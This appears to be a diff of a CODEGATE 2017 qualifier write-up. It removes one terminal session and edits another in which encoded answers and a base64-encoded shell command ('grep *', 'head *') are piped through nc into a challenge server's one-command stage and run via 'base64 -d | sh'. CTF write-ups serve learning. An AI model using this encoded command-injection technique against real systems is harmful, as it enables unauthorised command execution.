@@ -7,24 +7,7 @@ title : CODEGATE 2017 prequals writeup
 
 ```
 
-$ (echo TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5OigA; echo aa; echo aaa; echo 'grep *' | base64 ; cat) | nc 110.10.212.138 19091
-[*] Ok, Let's Start. Input the write string on each stage!:)
-[*] -- STAGE 01 ----------
-[+] KEY : H??x?H)?H?H???L??H)??1??D
-[+] Input > 
-[*] USER : N0_m4n_c4l1_ag4in_Y3st3rd4y:(
-[+] -- NEXT STAGE! ----------
-[*] -- STAGE 02 ----------
-[+] Input 1 
-[+] Input 2 
-[+] -- NEXT STAGE! ----------
-[*] -- STAGE 03 ----------
-[+] Ok, It's easy task to you, isn't it? :)
-[+] So I will give a chance to execute one command! :)
-[*] Input > 
-#                                                               echo -n Z3JlcCAqCg== | base64 -d | sh
-
-[tsun@host-163-44-172-213 ~]$ (echo TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5OigA; echo aa; echo aaa; echo 'head *' | base64 ; cat) | nc 110.10.212.138 19091
+$ (echo TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5OigA; echo aa; echo aaa; echo 'head *' | base64 ; cat) | nc 110.10.212.138 19091
 [*] Ok, Let's Start. Input the write string on each stage!:)
 [*] -- STAGE 01 ----------
 [+] KEY : H??x?H)?H?H???L??H)??1??D
